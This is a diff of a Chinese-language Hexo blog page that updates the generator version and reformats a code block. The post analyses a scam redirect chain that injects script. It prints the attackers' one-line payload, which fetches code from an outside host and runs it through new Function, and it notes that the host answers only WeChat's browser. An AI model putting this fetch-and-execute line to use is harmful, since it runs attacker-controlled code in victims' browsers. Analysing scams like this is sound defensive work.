@@ -32,7 +32,7 @@ fetch(&#39;//iprozz.com/ffff&#39;).then(r=&gt;r.text()).then">
     
     <script src="/libs/jquery/jquery.min.js"></script>
     
-<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="不知" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="不知" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-duotone-light.css" type="text/css"></head>
 
 
@@ -409,7 +409,8 @@ fetch(&#39;//iprozz.com/ffff&#39;).then(r=&gt;r.text()).then">
 <p>跳转之后，出现 sougou 的页面，然后重定向到广告页面。</p>
 <p><img src="/images/2022/10/06/16650521657367.jpg"></p>
 <p>构造了一个 xss，script 标签，被执行。</p>
-<pre class=" language-js"><code class="language-js"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'//iprozz.com/ffff'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>r<span class="token operator">=</span><span class="token operator">></span>r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>C<span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<pre class=" language-js"><code class="language-js"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'//iprozz.com/ffff'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>r<span class="token operator">=</span><span class="token operator">></span>r<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>C<span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span>C<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
 <p><code>iprozz.com/ffff</code> 请求发出去之后，被执行，页面跳转到广告页面。<code>new Function(C)()</code> 这种函数执行方式平时用的还是非常少的，安全方面，各种奇奇怪怪的写法，挺有意思。</p>
 <p>如果只是到这里，也没必要写这篇博客。尝试调试的时候，发现，在一般浏览器里面是无法请求这个地址的，似乎只在微信的浏览器的可以请求，应该是识别了微信的ua。这样二级跳转，可以对域名做一层保护，减少被封。当域名被封之后，也可以修改服务端的跳转地址，实现快速更换域名的目的。</p>
 <p>做戏做全套，我们平时的开发中经常抱有侥幸心理，对比一下人家的态度，我们真的能比骗子更专业吗？</p>
